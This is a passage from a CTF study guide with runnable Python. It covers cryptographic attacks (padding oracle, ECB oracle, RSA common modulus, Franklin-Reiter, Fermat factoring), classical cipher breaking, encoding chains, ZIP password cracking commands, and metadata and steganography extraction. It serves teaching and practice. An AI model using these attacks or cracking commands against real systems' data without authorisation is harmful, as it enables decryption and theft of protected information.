    cipher = AES.new(KEY, AES.MODE_ECB)
    data = user_input + SECRET
    return cipher.encrypt(pad(data, 16))

recovered = ecb_oracle_attack(oracle)
"""
```

**Scenario: CBC Padding Oracle**

python

```python
def padding_oracle_attack(ciphertext, iv, padding_oracle, block_size=16):
    """
    CBC padding oracle attack to decrypt without key
    
    Args:
        ciphertext: encrypted data
        iv: initialization vector
        padding_oracle: function that returns True if padding is valid
        block_size: cipher block size
    """
    plaintext = b''
    
    # Process each block
    blocks = [iv] + [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    
    for block_num in range(1, len(blocks)):
        print(f"[*] Attacking block {block_num}/{len(blocks)-1}")
        
        current_block = blocks[block_num]
        previous_block = blocks[block_num - 1]
        
        decrypted_block = bytearray(block_size)
        
        # Attack each byte in block (right to left)
        for byte_pos in range(block_size - 1, -1, -1):
            # Calculate required padding value
            padding_value = block_size - byte_pos
            
            # Craft malicious IV
            crafted_iv = bytearray(previous_block)
            
            # Set known bytes to produce correct padding
            for k in range(byte_pos + 1, block_size):
                crafted_iv[k] = previous_block[k] ^ decrypted_block[k] ^ padding_value
            
            # Brute force current byte
            for guess in range(256):
                crafted_iv[byte_pos] = guess
                
                # Query oracle
                if padding_oracle(bytes(crafted_iv) + current_block):
                    # Valid padding found
                    decrypted_block[byte_pos] = guess ^ padding_value ^ previous_block[byte_pos]
                    
                    # Verify it's not false positive
                    if byte_pos == block_size - 1:
                        # Could be multiple valid paddings, verify
                        crafted_iv[byte_pos - 1] ^= 1
                        if not padding_oracle(bytes(crafted_iv) + current_block):
                            continue
                        crafted_iv[byte_pos - 1] ^= 1
                    
                    print(f"  [+] Byte {byte_pos}: 0x{decrypted_block[byte_pos]:02x}")
                    break
        
        plaintext += bytes(decrypted_block)
    
    # Remove padding
    padding_len = plaintext[-1]
    if all(b == padding_len for b in plaintext[-padding_len:]):
        plaintext = plaintext[:-padding_len]
    
    return plaintext

# Example oracle
"""
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY = b'sixteen_byte_key'
IV = b'sixteen_byte_iv_'

def padding_oracle(data):
    try:
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        plaintext = cipher.decrypt(data)
        unpad(plaintext, 16)  # Raises exception on invalid padding
        return True
    except:
        return False

# Encrypt target
cipher = AES.new(KEY, AES.MODE_CBC, IV)
ct = cipher.encrypt(pad(b'secret_flag', 16))

# Attack
plaintext = padding_oracle_attack(ct, IV, padding_oracle)
"""
```

#### Mathematical Relationship Patterns

**Scenario: GCD-Based Key Recovery**

python

```python
from math import gcd
from Crypto.Util.number import long_to_bytes

def common_modulus_attack(n, e1, e2, c1, c2):
    """
    RSA common modulus attack
    
    When same message encrypted with same n but different e values
    """
    print("[*] Attempting common modulus attack...")
    
    # Extended GCD to find s1, s2 such that e1*s1 + e2*s2 = gcd(e1, e2)
    def egcd(a, b):
        if b == 0:
            return (a, 1, 0)
        else:
            g, y, x = egcd(b, a % b)
            return (g, x, y - (a // b) * x)
    
    g, s1, s2 = egcd(e1, e2)
    
    if g != 1:
        print("[!] e1 and e2 are not coprime, attack may fail")
        return None
    
    # Calculate m = (c1^s1 * c2^s2) mod n
    # Need to handle negative exponents
    if s1 < 0:
        c1 = pow(c1, -1, n)
        s1 = -s1
    if s2 < 0:
        c2 = pow(c2, -1, n)
        s2 = -s2
    
    m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
    
    plaintext = long_to_bytes(m)
    print(f"[+] Recovered plaintext: {plaintext}")
    
    return plaintext

# Example
"""
n = 0x...  # Common modulus
e1 = 65537
e2 = 65539
c1 = 0x...  # Message encrypted with e1
c2 = 0x...  # Same message encrypted with e2

plaintext = common_modulus_attack(n, e1, e2, c1, c2)
"""
```

**Scenario: Related Message Attack**

python

```python
def franklin_reiter_related_message(n, e, c1, c2, relation_func):
    """
    Franklin-Reiter attack on related messages
    
    When m2 = f(m1) for known linear function f
    Example: m2 = m1 + r or m2 = a*m1 + b
    """
    from sage.all import *
    
    print("[*] Franklin-Reiter related message attack...")
    
    # Build polynomials
    P.<X> = PolynomialRing(Zmod(n))
    
    # f1(X) = X^e - c1
    f1 = X^e - c1
    
    # f2(X) = relation_func(X)^e - c2
    # Example: if m2 = m1 + r, then f2 = (X + r)^e - c2
    f2 = relation_func(X)^e - c2
    
    # Compute GCD of polynomials
    g = f1.gcd(f2)
    
    if g.degree() == 1:
        # Extract m1 from linear polynomial
        m1 = -g.coefficients()[0] / g.coefficients()[1]
        m1 = int(m1)
        
        print(f"[+] Message recovered: {long_to_bytes(m1)}")
        return m1
    else:
        print("[-] Attack failed - GCD degree is not 1")
        return None

# Example usage in Sage
"""
n = ...
e = 3  # Small exponent makes this attack effective
c1 = ...
c2 = ...
r = 42  # Known difference: m2 = m1 + 42

def relation(X):
    return X + r

m1 = franklin_reiter_related_message(n, e, c1, c2, relation)
"""
```

**Scenario: Fermat Factorization (Close Primes)**

python

```python
import math
from Crypto.Util.number import long_to_bytes

def fermat_factorization(n, max_iterations=100000):
    """
    Fermat's factorization for RSA with close primes
    
    Efficient when |p - q| is small
    """
    print("[*] Attempting Fermat factorization...")
    
    a = math.isqrt(n) + 1
    b2 = a * a - n
    
    for i in range(max_iterations):
        b = math.isqrt(b2)
        
        if b * b == b2:
            # Found factors
            p = a + b
            q = a - b
            
            print(f"[+] Factors found!")
            print(f"    p = {p}")
            print(f"    q = {q}")
            
            return (p, q)
        
        a += 1
        b2 = a * a - n
        
        if i % 10000 == 0:
            print(f"  Iteration {i}/{max_iterations}")
    
    print("[-] Factorization failed")
    return None

def recover_rsa_key_fermat(n, e, c):
    """
    Full RSA key recovery using Fermat factorization
    """
    # Factor n
    factors = fermat_factorization(n)
    
    if not factors:
        return None
    
    p, q = factors
    
    # Calculate private exponent
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    
    # Decrypt
    m = pow(c, d, n)
    plaintext = long_to_bytes(m)
    
    print(f"[+] Decrypted message: {plaintext}")
    
    return plaintext

# Example: RSA with close primes
"""
p = next_prime(2^512)
q = next_prime(p + 1000)  # Very close to p
n = p * q
e = 65537

# This n is vulnerable to Fermat factorization
"""
```

### Important Related Topics

For comprehensive key recovery techniques, consider these essential areas:

- **Weak Random Number Generators** - LCG prediction, Mersenne Twister state recovery, PRNG seed extraction
- **Nonce Reuse Attacks** - ECDSA/DSA nonce reuse, stream cipher nonce reuse, authentication bypass
- **Side-Channel Attacks** - Cache timing, power analysis, acoustic cryptanalysis, electromagnetic emanations
- **Algebraic Attacks** - Gröbner basis methods, SAT solver approaches, linear/differential cryptanalysis

---

## Practical CTF Patterns

#### ROT-N Variants

**Classic ROT13**

```python
def rot13(text):
    """Standard ROT13 - Caesar cipher with shift 13"""
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
        else:
            result.append(char)
    return ''.join(result)

# Test
plaintext = "CTF{hidden_flag}"
ciphertext = rot13(plaintext)
print(f"Encrypted: {ciphertext}")
print(f"Decrypted: {rot13(ciphertext)}")  # ROT13 is self-inverse
```

**Generic Caesar Cipher (ROT-N) Brute Force**

```python
def caesar_bruteforce(ciphertext):
    """Try all 26 possible shifts"""
    results = []
    
    for shift in range(26):
        decrypted = []
        for char in ciphertext:
            if 'a' <= char <= 'z':
                decrypted.append(chr((ord(char) - ord('a') - shift) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                decrypted.append(chr((ord(char) - ord('A') - shift) % 26 + ord('A')))
            else:
                decrypted.append(char)
        
        plaintext = ''.join(decrypted)
        
        # Score based on common English patterns
        score = 0
        if 'the' in plaintext.lower():
            score += 3
        if 'CTF{' in plaintext or 'flag{' in plaintext:
            score += 10
        if any(word in plaintext.lower() for word in ['and', 'is', 'it', 'to']):
            score += 1
        
        results.append({
            'shift': shift,
            'plaintext': plaintext,
            'score': score
        })
    
    # Return sorted by score
    return sorted(results, key=lambda x: x['score'], reverse=True)

# Usage
ciphertext = "FWI{klgghq_iodn}"
best_results = caesar_bruteforce(ciphertext)
for result in best_results[:3]:
    print(f"Shift {result['shift']}: {result['plaintext']} (score: {result['score']})")
```

**ROT47 (Extends to All Printable ASCII)**

```python
def rot47(text):
    """ROT47 - Applies to all printable ASCII (33-126)"""
    result = []
    for char in text:
        if 33 <= ord(char) <= 126:
            # Shift within printable ASCII range
            result.append(chr(33 + (ord(char) - 33 + 47) % 94))
        else:
            result.append(char)
    return ''.join(result)

# Self-inverse like ROT13
plaintext = "CTF{r0t47_1s_fun!}"
encrypted = rot47(plaintext)
decrypted = rot47(encrypted)
print(f"Original: {plaintext}")
print(f"Encrypted: {encrypted}")
print(f"Decrypted: {decrypted}")
```

**Custom Alphabet Substitution**

```python
def custom_alphabet_cipher(text, key_alphabet):
    """
    Substitution cipher with custom alphabet
    key_alphabet: 26-character string defining substitution
    """
    normal = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    
    if len(key_alphabet) != 26:
        raise ValueError("Key alphabet must be 26 characters")
    
    trans_table = str.maketrans(
        normal + normal.lower(),
        key_alphabet.upper() + key_alphabet.lower()
    )
    
    return text.translate(trans_table)

def break_substitution_cipher(ciphertext):
    """
    Break substitution cipher using frequency analysis
    """
    # English letter frequency (approximate)
    english_freq = 'ETAOINSHRDLCUMWFGYPBVKJXQZ'
    
    # Count letter frequency in ciphertext
    from collections import Counter
    letter_counts = Counter(c.upper() for c in ciphertext if c.isalpha())
    cipher_freq = ''.join([letter for letter, count in letter_counts.most_common()])
    
    # Create mapping
    mapping = {}
    for i, cipher_letter in enumerate(cipher_freq[:26]):
        if i < len(english_freq):
            mapping[cipher_letter] = english_freq[i]
            mapping[cipher_letter.lower()] = english_freq[i].lower()
    
    # Decrypt using mapping
    decrypted = []
    for char in ciphertext:
        if char in mapping:
            decrypted.append(mapping[char])
        else:
            decrypted.append(char)
    
    return {
        'cipher_frequency': cipher_freq,
        'english_frequency': english_freq,
        'mapping': mapping,
        'decrypted': ''.join(decrypted)
    }

# Usage
ciphertext = "SYFXMNSLAJ FY MJ HTSYMNAJ"
result = break_substitution_cipher(ciphertext)
print(f"Decrypted: {result['decrypted']}")
```

**Multi-Stage ROT Variations**

```python
def rot_pyramid(text, start_shift=1):
    """
    Each character uses different shift: 1, 2, 3, ..., then wraps
    """
    result = []
    shift = start_shift
    
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char) - ord('a') + shift) % 26 + ord('a')))
            shift = (shift % 26) + 1
        elif 'A' <= char <= 'Z':
            result.append(chr((ord(char) - ord('A') + shift) % 26 + ord('A')))
            shift = (shift % 26) + 1
        else:
            result.append(char)
    
    return ''.join(result)

def rot_pyramid_decrypt(ciphertext, start_shift=1):
    """Decrypt pyramid ROT"""
    result = []
    shift = start_shift
    
    for char in ciphertext:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char) - ord('a') - shift) % 26 + ord('a')))
            shift = (shift % 26) + 1
        elif 'A' <= char <= 'Z':
            result.append(chr((ord(char) - ord('A') - shift) % 26 + ord('A')))
            shift = (shift % 26) + 1
        else:
            result.append(char)
    
    return ''.join(result)

# Automated detection and decryption
def detect_rot_variant(ciphertext):
    """Try to identify which ROT variant is used"""
    results = []
    
    # Try standard ROT13
    rot13_result = rot13(ciphertext)
    if 'CTF' in rot13_result or 'flag' in rot13_result.lower():
        results.append(('ROT13', rot13_result))
    
    # Try ROT47
    rot47_result = rot47(ciphertext)
    if 'CTF' in rot47_result or 'flag' in rot47_result.lower():
        results.append(('ROT47', rot47_result))
    
    # Try all Caesar shifts
    for shift in range(1, 26):
        test = caesar_bruteforce(ciphertext)
        if test[0]['score'] > 5:
            results.append((f'ROT{shift}', test[0]['plaintext']))
    
    return results if results else [('UNKNOWN', 'No ROT pattern detected')]
```

**Atbash Cipher (Reverse Alphabet)**

```python
def atbash(text):
    """
    Atbash cipher: A↔Z, B↔Y, C↔X, etc.
    Self-inverse
    """
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr(ord('z') - (ord(char) - ord('a'))))
        elif 'A' <= char <= 'Z':
            result.append(chr(ord('Z') - (ord(char) - ord('A'))))
        else:
            result.append(char)
    return ''.join(result)

# Example
plaintext = "CTF{atbash_cipher}"
encrypted = atbash(plaintext)
decrypted = atbash(encrypted)
print(f"Original: {plaintext}")
print(f"Encrypted: {encrypted}")
print(f"Decrypted: {decrypted}")
```

#### Base64 + Cipher Chains

**Nested Encoding Detection**

```python
import base64
import binascii

def detect_encoding(data):
    """Detect what encoding/cipher is applied to data"""
    encodings = []
    
    # Check if it's Base64
    try:
        decoded = base64.b64decode(data, validate=True)
        encodings.append('base64')
        return encodings, decoded
    except:
        pass
    
    # Check if it's hex
    try:
        if all(c in '0123456789abcdefABCDEF' for c in data.replace(' ', '')):
            decoded = bytes.fromhex(data.replace(' ', ''))
            encodings.append('hex')
            return encodings, decoded
    except:
        pass
    
    # Check if it's Base32
    try:
        decoded = base64.b32decode(data)
        encodings.append('base32')
        return encodings, decoded
    except:
        pass
    
    # Check if it's URL encoding
    try:
        import urllib.parse
        decoded = urllib.parse.unquote(data)
        if decoded != data:
            encodings.append('url')
            return encodings, decoded.encode()
    except:
        pass
    
    return encodings, data.encode() if isinstance(data, str) else data

def recursive_decode(data, max_depth=10):
    """
    Recursively decode nested encodings
    Common pattern: Base64(Hex(Base64(plaintext)))
    """
    depth = 0
    current_data = data
    decode_chain = []
    
    while depth < max_depth:
        encodings, decoded = detect_encoding(current_data)
        
        if not encodings:
            break
        
        decode_chain.extend(encodings)
        
        # Check if decoded data looks like a flag
        try:
            decoded_str = decoded.decode('ascii', errors='ignore')
            if 'CTF{' in decoded_str or 'flag{' in decoded_str:
                return {
                    'found': True,
                    'flag': decoded_str,
                    'chain': decode_chain,
                    'depth': depth
                }
        except:
            pass
        
        current_data = decoded
        depth += 1
    
    return {
        'found': False,
        'chain': decode_chain,
        'final_data': current_data,
        'depth': depth
    }

# Example usage
encoded = base64.b64encode(
    bytes.fromhex(
        base64.b64encode(b"CTF{nested_encoding}").decode().encode().hex()
    )
).decode()

result = recursive_decode(encoded)
print(f"Decode chain: {' -> '.join(result['chain'])}")
if result['found']:
    print(f"Flag found: {result['flag']}")
```

**Common Encoding Chains**

```python
def decode_common_chains(data):
    """
    Try common CTF encoding combinations
    """
    chains = [
        # Base64 variations
        lambda x: base64.b64decode(x),
        lambda x: base64.b64decode(x.replace('-', '+').replace('_', '/')),  # URL-safe Base64
        
        # Hex variations
        lambda x: bytes.fromhex(x),
        lambda x: bytes.fromhex(x.replace(' ', '').replace(':', '')),
        
        # Base32
        lambda x: base64.b32decode(x),
        
        # Combined chains
        lambda x: bytes.fromhex(base64.b64decode(x).decode()),
        lambda x: base64.b64decode(bytes.fromhex(x)),
        lambda x: bytes.fromhex(base64.b64decode(x).decode('ascii')),
    ]
    
    results = []
    
    for i, decode_func in enumerate(chains):
        try:
            decoded = decode_func(data)
            decoded_str = decoded.decode('ascii', errors='ignore')
            
            results.append({
                'chain_id': i,
                'success': True,
                'decoded': decoded_str,
                'has_flag': 'CTF{' in decoded_str or 'flag{' in decoded_str
            })
        except Exception as e:
            results.append({
                'chain_id': i,
                'success': False,
                'error': str(e)
            })
    
    # Return successful decodings with flags first
    return sorted([r for r in results if r['success']], 
                  key=lambda x: x['has_flag'], reverse=True)
```

**Base64 with Custom Alphabet**

```python
def custom_base64_decode(data, custom_alphabet):
    """
    Decode Base64 with custom alphabet
    Standard: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
    """
    standard_alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    # Create translation table
    trans_table = str.maketrans(custom_alphabet, standard_alphabet)
    
    # Translate and decode
    translated = data.translate(trans_table)
    return base64.b64decode(translated)

def detect_base64_alphabet(encoded_data, known_plaintext=None):
    """
    Try to detect custom Base64 alphabet
    """
    if known_plaintext:
        # Use known plaintext to derive alphabet
        standard = base64.b64encode(known_plaintext).decode()
        
        # Build character mapping
        mapping = {}
        for i, (enc_char, std_char) in enumerate(zip(encoded_data, standard)):
            if enc_char != std_char:
                mapping[enc_char] = std_char
        
        return mapping
    
    return None

# Example
custom_alpha = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/"
plaintext = b"CTF{custom_base64}"
encoded = base64.b64encode(plaintext).decode()
encoded_custom = encoded.translate(str.maketrans(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
    custom_alpha
))

print(f"Custom encoded: {encoded_custom}")
decoded = custom_base64_decode(encoded_custom, custom_alpha)
print(f"Decoded: {decoded}")
```

**Base85/Ascii85**

```python
import base64

def base85_operations(data):
    """
    Base85 encoding/decoding (more efficient than Base64)
    Often seen in CTFs as an unusual encoding
    """
    if isinstance(data, str):
        data = data.encode()
    
    # Encode
    encoded = base64.b85encode(data)
    
    # Decode
    decoded = base64.b85decode(encoded)
    
    return {
        'encoded': encoded.decode(),
        'decoded': decoded.decode()
    }

# Ascii85 (similar but different)
def ascii85_decode(data):
    """
    Ascii85 decode (used in PostScript/PDF)
    """
    # Remove <~ and ~> markers if present
    data = data.strip()
    if data.startswith('<~') and data.endswith('~>'):
        data = data[2:-2]
    
    try:
        import base64
        # Python's a85decode handles Ascii85
        return base64.a85decode(data)
    except:
        return None
```

#### Metadata Hiding (EXIF, ZIP Comments)

**EXIF Metadata Extraction**

```bash
# Command-line tools
exiftool image.jpg                    # Comprehensive metadata
exiftool -Comment image.jpg           # Specific field
exiftool -all= image.jpg              # Strip all metadata
identify -verbose image.jpg           # ImageMagick
strings image.jpg | grep -i "flag"    # Quick string search

# Extract GPS coordinates
exiftool -GPS* image.jpg

# Extract hidden comments
exiftool -Comment -UserComment -Description image.jpg
```

```python
# Python EXIF extraction
def extract_exif_data(image_path):
    """
    Extract all EXIF metadata from image
    """
    try:
        from PIL import Image
        from PIL.ExifTags import TAGS
        
        image = Image.open(image_path)
        exif_data = image._getexif()
        
        if not exif_data:
            return {'error': 'No EXIF data found'}
        
        decoded_exif = {}
        for tag_id, value in exif_data.items():
            tag = TAGS.get(tag_id, tag_id)
            decoded_exif[tag] = value
        
        # Check for flag patterns
        flag_candidates = []
        for key, value in decoded_exif.items():
            if isinstance(value, (str, bytes)):
                value_str = str(value)
                if 'CTF{' in value_str or 'flag{' in value_str:
                    flag_candidates.append({
                        'field': key,
                        'value': value_str
                    })
        
        return {
            'exif_data': decoded_exif,
            'flag_candidates': flag_candidates,
            'interesting_fields': {k: v for k, v in decoded_exif.items() 
                                   if k in ['Comment', 'UserComment', 'ImageDescription', 
                                           'Copyright', 'Artist', 'Make', 'Model']}
        }
    
    except ImportError:
        return {'error': 'PIL not installed: pip install Pillow'}
    except Exception as e:
        return {'error': str(e)}

# Quick flag search in image metadata
def quick_image_flag_search(image_path):
    """Search for flags in image using multiple methods"""
    results = []
    
    # Method 1: EXIF
    exif_result = extract_exif_data(image_path)
    if 'flag_candidates' in exif_result and exif_result['flag_candidates']:
        results.extend(exif_result['flag_candidates'])
    
    # Method 2: String search in raw bytes
    try:
        with open(image_path, 'rb') as f:
            content = f.read()
            content_str = content.decode('latin-1', errors='ignore')
            
            import re
            flags = re.findall(r'(CTF\{[^}]+\}|flag\{[^}]+\})', content_str, re.IGNORECASE)
            for flag in flags:
                results.append({'method': 'raw_bytes', 'value': flag})
    except:
        pass
    
    return results
```

**ZIP Archive Metadata**

```bash
# Extract ZIP comments
unzip -z archive.zip

# List archive contents with details
zipinfo -v archive.zip
unzip -l archive.zip

# Extract with password
unzip -P password archive.zip

# Brute force ZIP password
fcrackzip -b -c aA1 -l 1-8 -u archive.zip
john --format=zip archive.zip.hash
```

```python
import zipfile

def extract_zip_metadata(zip_path):
    """
    Extract all metadata from ZIP file
    """
    metadata = {
        'archive_comment': None,
        'file_comments': [],
        'files': [],
        'flags_found': []
    }
    
    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            # Archive-level comment
            archive_comment = zf.comment.decode('utf-8', errors='ignore')
            metadata['archive_comment'] = archive_comment
            
            if 'CTF{' in archive_comment or 'flag{' in archive_comment:
                metadata['flags_found'].append({
                    'location': 'archive_comment',
                    'value': archive_comment
                })
            
            # File-level metadata
            for info in zf.infolist():
                file_data = {
                    'filename': info.filename,
                    'comment': info.comment.decode('utf-8', errors='ignore'),
                    'compress_type': info.compress_type,
                    'compress_size': info.compress_size,
                    'file_size': info.file_size,
                    'date_time': info.date_time,
                    'CRC': hex(info.CRC),
                    'flag_mask': info.flag_bits
                }
                
                metadata['file_comments'].append(file_data)
                
                # Check file comment for flags
                if 'CTF{' in file_data['comment'] or 'flag{' in file_data['comment']:
                    metadata['flags_found'].append({
                        'location': f"file_comment:{info.filename}",
                        'value': file_data['comment']
                    })
    
    except Exception as e:
        metadata['error'] = str(e)
    
    return metadata

def modify_zip_comment(zip_path, new_comment):
    """Add or modify ZIP archive comment"""
    with zipfile.ZipFile(zip_path, 'a') as zf:
        zf.comment = new_comment.encode('utf-8')

# ZIP known plaintext attack preparation
def prepare_known_plaintext_attack(known_file, encrypted_zip):
    """
    Prepare files for pkcrack known-plaintext attack
    """
    return {
        'tool': 'pkcrack',
        'command': f'pkcrack -C {encrypted_zip} -c file_in_zip.txt -P {known_file} -p known.txt -d decrypted.zip',
        'requirements': [
            'At least 12 bytes of known plaintext',
            'Known plaintext must be from beginning of file',
            'Both files must be in same compression state'
        ]
    }
```

**Other Archive Formats**

```python
import tarfile
import py7zr

def extract_tar_metadata(tar_path):
    """Extract metadata from TAR archives"""
    metadata = {'files': []}
    
    try:
        with tarfile.open(tar_path, 'r:*') as tar:
            for member in tar.getmembers():
                file_info = {
                    'name': member.name,
                    'size': member.size,
                    'mode': oct(member.mode),
                    'uid': member.uid,
                    'gid': member.gid,
                    'mtime': member.mtime,
                    'type': member.type,
                    'linkname': member.linkname,
                    'uname': member.uname,
                    'gname': member.gname
                }
                metadata['files'].append(file_info)
    
    except Exception as e:
        metadata['error'] = str(e)
    
    return metadata

def extract_7z_metadata(archive_path):
    """Extract metadata from 7z archives"""
    try:
        with py7zr.SevenZipFile(archive_path, 'r') as archive:
            return {
                'files': archive.getnames(),
                'test_result': archive.testzip()
            }
    except ImportError:
        return {'error': 'py7zr not installed: pip install py7zr'}
    except Exception as e:
        return {'error': str(e)}
```

#### PNG/Image Corruption

**PNG Chunk Analysis**

```python
import struct
import zlib

def parse_png_chunks(png_path):
    """
    Parse PNG file structure and extract all chunks
    PNG format: signature + chunks
    Each chunk: length (4) + type (4) + data + CRC (4)
    """
    chunks = []
    
    with open(png_path, 'rb') as f:
        # Verify PNG signature
        signature = f.read(8)
        if signature != b'\x89PNG\r\n\x1a\n':
            return {'error': 'Not a valid PNG file'}
        
        # Parse chunks
        while True:
            # Read chunk header
            length_bytes = f.read(4)
            if not length_bytes:
                break
            
            length = struct.unpack('>I', length_bytes)[0]
            chunk_type = f.read(4).decode('ascii', errors='ignore')
            chunk_data = f.read(length)
            crc = struct.unpack('>I', f.read(4))[0]
            
            # Verify CRC
            calculated_crc = zlib.crc32(chunk_type.encode() + chunk_data)
            crc_valid = (calculated_crc & 0xffffffff) == crc
            
            chunk_info = {
                'type': chunk_type,
                'length': length,
                'crc': hex(crc),
                'crc_valid': crc_valid,
                'data_preview': chunk_data[:100].hex() if length > 0 else ''
            }
            
            # Check for hidden data in specific chunks
            if chunk_type not in ['IHDR', 'PLTE', 'IDAT', 'IEND', 'tRNS', 'gAMA', 'cHRM']:
                chunk_info['unusual'] = True
                # Try to decode as text
                try:
                    text_data = chunk_data.decode('utf-8', errors='ignore')
                    if 'CTF{' in text_data or 'flag{' in text_data:
                        chunk_info['possible_flag'] = text_data
                except:
                    pass
            
            chunks.append(chunk_info)
    
    return {'chunks': chunks}

def extract_png_text_chunks(png_path):
    """
    Extract text from PNG tEXt, zTXt, and iTXt chunks
    """
    text_data = []
    
    with open(png_path, 'rb') as f:
        f.read(8)  # Skip signature
        
        while True:
            try:
                length_bytes = f.read(4)
                if not length_bytes:
                    break
                
                length = struct.unpack('>I', length_bytes)[0]
                chunk_type = f.read(4).decode('ascii')
                chunk_data = f.read(length)
                f.read(4)  # CRC
                
                if chunk_type == 'tEXt':
                    # Uncompressed text: keyword\0text
                    null_pos = chunk_data.find(b'\x00')
                    keyword = chunk_data[:null_pos].decode('latin-1')
                    text = chunk_data[null_pos+1:].decode('latin-1', errors='ignore')
                    text_data.append({'type': 'tEXt', 'keyword': keyword, 'text': text})
                
                elif chunk_type == 'zTXt':
                    # Compressed text
                    null_pos = chunk_data.find(b'\x00')
                    keyword = chunk_data[:null_pos].decode('latin-1')
                    compression = chunk_data[null_pos+1]
                    compressed_text = chunk_data[null_pos+2:]
                    text = zlib.decompress(compressed_text).decode('latin-1', errors='ignore')
                    text_data.append({'type': 'zTXt', 'keyword': keyword, 'text': text})
                
                elif chunk_type == 'iTXt':
                    # International text (UTF-8)
                    parts = chunk_data.split(b'\x00', 4)
                    if len(parts) >= 5:
                        keyword = parts[0].decode('latin-1')
                        text = parts[4].decode('utf-8', errors='ignore')
                        text_data.append({'type': 'iTXt', 'keyword': keyword, 'text': text})
            
            except:
                break
    
    return text_data
```

**PNG Steganography Detection**

```bash
# Command-line tools for PNG analysis
pngcheck -v image.png                 # Verify PNG integrity and list chunks
pngcheck -cvt image.png               # Verbose chunk information
exiftool image.png                    # Extract metadata
zsteg image.png                       # Detect steganography
zsteg -a image.png                    # All detection methods
stegsolve image.png                   # Visual analysis tool

# LSB steganography detection
stegdetect image.png

# Extract hidden data
steghide extract -sf image.png

# Binwalk for embedded files
binwalk -e image.png
binwalk --dd='.*' image.png
```

```python
def detect_lsb_steganography(image_path):
    """
    Detect Least Significant Bit steganography
    """
    try:
        from PIL import Image
        import numpy as np
        
        img = Image.open(image_path)
        pixels = np.array(img)
        
        # Extract LSBs
        lsb_data = []
        for row in pixels:
            for pixel in row:
                if isinstance(pixel, np.ndarray):
                    # RGB/RGBA
                    for channel in pixel:
                        lsb_data.append(channel & 1)
                else:
                    # Grayscale
                    lsb_data.append(pixel & 1)
        
        # Convert bits to bytes
        lsb_bytes = []
        for i in range(0, len(lsb_data), 8):
            byte_bits = lsb_data[i:i+8]
            if len(byte_bits) == 8:
                byte_val = int(''.join(map(str, byte_bits)), 2)
                lsb_bytes.append(byte_val)
        
        lsb_data_bytes = bytes(lsb_bytes)
        
        # Look for patterns
        lsb_str = lsb_data_bytes.decode('latin-1', errors='ignore')
        
        return {
            'lsb_length': len(lsb_bytes),
            'has_flag': 'CTF{' in lsb_str or 'flag{' in lsb_str,
            'preview': lsb_str[:200],
            'entropy': calculate_entropy(lsb_data_bytes)
        }
    
    except ImportError:
        return {'error': 'PIL/numpy not installed'}

def calculate_entropy(data):
    """Calculate Shannon entropy of data"""
    from collections import Counter
    import math
    
    if not data:
        return 0
    
    counter = Counter(data)
    length = len(data)
    entropy = 0
    for count in counter.values():
        probability = count / length
        entropy -= probability * math.log2(probability)
    
    return entropy

def extract_lsb_data(image_path, num_bits=1):
    """
    Extract data hidden in LSB of image
    num_bits: how many least significant bits to extract (1-8)
    """
    try:
        from PIL import Image
        import numpy as np
        
        img = Image.open(image_path)
        pixels = np.array(img)
        
        extracted_bits = []
        
        # Flatten pixel array
        if len(pixels.shape) == 3:
            # Color image
            flat_pixels = pixels.reshape(-1)
        else:
            # Grayscale
            flat_pixels = pixels.flatten()
        
        # Extract LSBs
        for pixel_value in flat_pixels:
            for bit_pos in range(num_bits):
                bit = (pixel_value >> bit_pos) & 1
                extracted_bits.append(bit)
        
        # Convert bits to bytes
        extracted_bytes = []
        for i in range(0, len(extracted_bits), 8):
            if i + 8 <= len(extracted_bits):
                byte_bits = extracted_bits[i:i+8]
                byte_val = int(''.join(map(str, byte_bits)), 2)
                extracted_bytes.append(byte_val)
        
        data = bytes(extracted_bytes)
        
        # Try to find meaningful data
        try:
            text = data.decode('utf-8', errors='ignore')
            # Look for flag patterns
            import re
            flags = re.findall(r'CTF\{[^}]+\}|flag\{[^}]+\}', text, re.IGNORECASE)
            
            return {
                'success': True,
                'data_length': len(data),
                'flags_found': flags,
                'text_preview': text[:500]
            }
        except:
            return {
                'success': True,
                'data_length': len(data),
                'binary_data': data[:100].hex()
            }
    
    except Exception as e:
        return {'error': str(e)}
```

**Image Corruption Repair**

```python
def fix_png_header(corrupted_path, output_path):
    """
    Fix corrupted PNG file signature
    Correct signature: 89 50 4E 47 0D 0A 1A 0A
    """
    with open(corrupted_path, 'rb') as f:
        data = f.read()
    
    # PNG signature
    correct_signature = b'\x89PNG\r\n\x1a\n'
    
    # Replace first 8 bytes if corrupted
    if data[:8] != correct_signature:
        fixed_data = correct_signature + data[8:]
        
        with open(output_path, 'wb') as f:
            f.write(fixed_data)
        
        return {'fixed': True, 'original_header': data[:8].hex()}
    
    return {'fixed': False, 'message': 'Header already correct'}

def fix_png_dimensions(png_path, output_path, width=None, height=None):
    """
    Fix corrupted IHDR chunk (width/height)
    IHDR structure: width(4) height(4) bit_depth(1) color_type(1) 
                    compression(1) filter(1) interlace(1)
    """
    with open(png_path, 'rb') as f:
        data = bytearray(f.read())
    
    # Find IHDR chunk (after 8-byte signature)
    ihdr_pos = 8 + 4  # Skip signature and length
    
    if data[ihdr_pos:ihdr_pos+4] != b'IHDR':
        return {'error': 'IHDR chunk not found'}
    
    # IHDR data starts at ihdr_pos + 4
    ihdr_data_pos = ihdr_pos + 4
    
    if width:
